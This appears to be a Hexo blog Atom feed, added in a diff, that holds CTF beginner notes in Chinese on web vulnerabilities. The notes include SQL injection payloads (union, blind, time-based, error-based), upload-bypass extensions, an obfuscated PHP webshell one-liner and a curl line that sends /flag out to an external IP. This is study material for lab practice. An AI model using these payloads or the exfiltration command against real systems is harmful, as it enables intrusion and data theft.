@@ -1,0 +1,59 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>tcyba</title>
+  
+  
+  <link href="http://example.com/atom.xml" rel="self"/>
+  
+  <link href="http://example.com/"/>
+  <updated>2020-09-30T13:43:28.993Z</updated>
+  <id>http://example.com/</id>
+  
+  <author>
+    <name>John Doe</name>
+    
+  </author>
+  
+  <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title></title>
+    <link href="http://example.com/2020/09/30/9-28/"/>
+    <id>http://example.com/2020/09/30/9-28/</id>
+    <published>2020-09-30T13:44:05.118Z</published>
+    <updated>2020-09-30T13:43:28.993Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="常见漏洞"><a href="#常见漏洞" class="headerlink" title="常见漏洞"></a>常见漏洞</h2><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><h4 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h4><p>sqli-labs less-1</p><ul><li><p>判断后台sql语句闭合方式</p></li><li><p>order by判断列数</p></li><li><p>判断回显位</p></li><li><p>注数据</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;1&#39;&#39; LIMIT 0,1&#39;</span><br><span class="line">&#39;1&#39;&#39; LIMIT 0,1</span><br><span class="line">select * from users where id&#x3D;&#39;$id&#39; LIMIT 0,1</span><br><span class="line">select * from users where id&#x3D;&#39;1&#39;#&#39; LIMIT 0,1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,3 %23</span><br><span class="line">?id&#x3D;-1&#39; union select 1,group_concat(schema_name),3 from information_schema.schemata%23</span><br></pre></td></tr></table></figure><h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><p>sqli-labs Less-5</p><p>bool盲注</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; and 0%23</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and if(substr(database(),1,1)&#x3D;&#39;s&#39;,1,0)%23</span><br><span class="line"></span><br><span class="line">1 and 1  &#x3D;&#x3D;&gt; 1</span><br><span class="line">0 or 1  &#x3D;&#x3D;&gt; 1</span><br></pre></td></tr></table></figure><p>延时注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; and if(substr(database(),1,1)&#x3D;&#39;s&#39;,sleep(3),0)%23</span><br></pre></td></tr></table></figure><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>sqli-labs Less-5</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39; and updatexml(1,concat(0x7e,database()),1)%23</span><br></pre></td></tr></table></figure><p>updatexml(XML_document, XPath_string, new_value)</p><p>XML_document是文档对象的名称</p><p>XPath_string是XPath格式的字符串(如果XPath_string不是XPath格式，则会报错并显示出XPath_string的值)</p><p>new_value替换查找到的数据</p><h3 id="文件上传-amp-文件包含"><a href="#文件上传-amp-文件包含" class="headerlink" title="文件上传&amp;文件包含"></a>文件上传&amp;文件包含</h3><h4 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h4><p>php3 php5 phtml .htaccess .user.ini</p><h4 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h4><p>没办法，看看有没有其他洞 解析漏洞</p><h4 id="各种包含getshell"><a href="#各种包含getshell" class="headerlink" title="各种包含getshell"></a>各种包含getshell</h4><p>简单的包含图片马</p><p>包含<code>data://</code> <code>php://input</code> 与php的配置有关</p><h3 id="代码注入-amp-命令注入"><a href="#代码注入-amp-命令注入" class="headerlink" title="代码注入&amp;命令注入"></a>代码注入&amp;命令注入</h3><h4 id="一些敏感的函数"><a href="#一些敏感的函数" class="headerlink" title="一些敏感的函数"></a>一些敏感的函数</h4><p>system shell_exec `` exec   …..</p><p>eval assert</p><h4 id="php语言的特性"><a href="#php语言的特性" class="headerlink" title="php语言的特性"></a>php语言的特性</h4><p>无字母数字webshell 异或 取反</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F; echo urlencode(~&#39;system&#39;);</span><br><span class="line">(~urldecode(&#39;%8C%86%8C%8B%9A%92&#39;))(&#39;id&#39;);</span><br></pre></td></tr></table></figure><h4 id="dnslog"><a href="#dnslog" class="headerlink" title="dnslog"></a>dnslog</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;dnsbin.zhack.ca&#x2F;</span><br><span class="line"></span><br><span class="line">curl 1.1.1.1:9000&#x2F;?a&#x3D;&#96;cat &#x2F;flag&#96;</span><br></pre></td></tr></table></figure><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><ul><li>反序列化中魔术方法的调用—-&gt;pop链</li></ul>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;moonback1314.gitee.io&#x2F;2019&#x2F;10&#x2F;27&#x2F;php-serialize&#x2F;</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;paper.seebug.org&#x2F;680&#x2F;</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;moonback1314.gitee.io&#x2F;2019&#x2F;10&#x2F;27&#x2F;php-serialize&#x2F;20191027210743.png</span><br></pre></td></tr></table></figure><h2 id="学习的一些建议"><a href="#学习的一些建议" class="headerlink" title="学习的一些建议"></a>学习的一些建议</h2><h3 id="多关注圈子社区公众号大佬博客"><a href="#多关注圈子社区公众号大佬博客" class="headerlink" title="多关注圈子社区公众号大佬博客"></a>多关注圈子社区公众号大佬博客</h3><p><a href="https://xz.aliyun.com/">https://xz.aliyun.com</a></p><p><a href="https://www.anquanke.com/">https://www.anquanke.com</a></p><p><a href="https://paper.seebug.org/">https://paper.seebug.org</a></p><p><a href="https://www.t00ls.net/">https://www.t00ls.net</a></p><p><a href="https://www.freebuf.com/">https://www.freebuf.com</a></p><p><a href="https://www.leavesongs.com/">https://www.leavesongs.com</a></p><p><a href="https://skysec.top/">https://skysec.top</a></p><p><a href="https://www.smi1e.top/">https://www.smi1e.top</a></p><p><a href="http://www.gem-love.com/">http://www.gem-love.com</a></p><h3 id="比赛"><a href="#比赛" class="headerlink" title="比赛"></a>比赛</h3><p><a href="https://ctftime.org/">https://ctftime.org/</a></p><p>微信小程序信安大赛</p><p>qq群</p><h3 id="做题平台"><a href="#做题平台" class="headerlink" title="做题平台"></a>做题平台</h3><p><a href="https://buuoj.cn/">https://buuoj.cn</a></p><p><a href="https://www.ctfhub.com/">https://www.ctfhub.com</a></p><p><a href="https://www.jarvisoj.com/">https://www.jarvisoj.com</a></p><p><a href="https://adworld.xctf.org.cn/">https://adworld.xctf.org.cn</a></p><p><a href="https://cgctf.nuptsast.com/">https://cgctf.nuptsast.com</a></p><p><a href="https://ctf.show/">https://ctf.show</a></p><p><a href="https://www.bugku.com/">https://www.bugku.com</a></p><h3 id="多搜多看"><a href="#多搜多看" class="headerlink" title="多搜多看"></a>多搜多看</h3><p><a href="https://www.php.net/manual/zh/index.php">https://www.php.net/manual/zh/index.php</a></p><p><a href="https://www.google.com/">https://www.google.com</a></p><p><a href="http://www.baidu.com/">http://www.baidu.com</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;常见漏洞&quot;&gt;&lt;a href=&quot;#常见漏洞&quot; class=&quot;headerlink&quot; title=&quot;常见漏洞&quot;&gt;&lt;/a&gt;常见漏洞&lt;/h2&gt;&lt;h3 id=&quot;sql注入&quot;&gt;&lt;a href=&quot;#sql注入&quot; class=&quot;headerlink&quot; title=&quot;sql注入&quot;&gt;</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Hello World</title>
+    <link href="http://example.com/2020/09/30/hello-world/"/>
+    <id>http://example.com/2020/09/30/hello-world/</id>
+    <published>2020-09-30T13:24:46.166Z</published>
+    <updated>2020-09-30T13:24:46.166Z</updated>
+    
+    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+</feed>
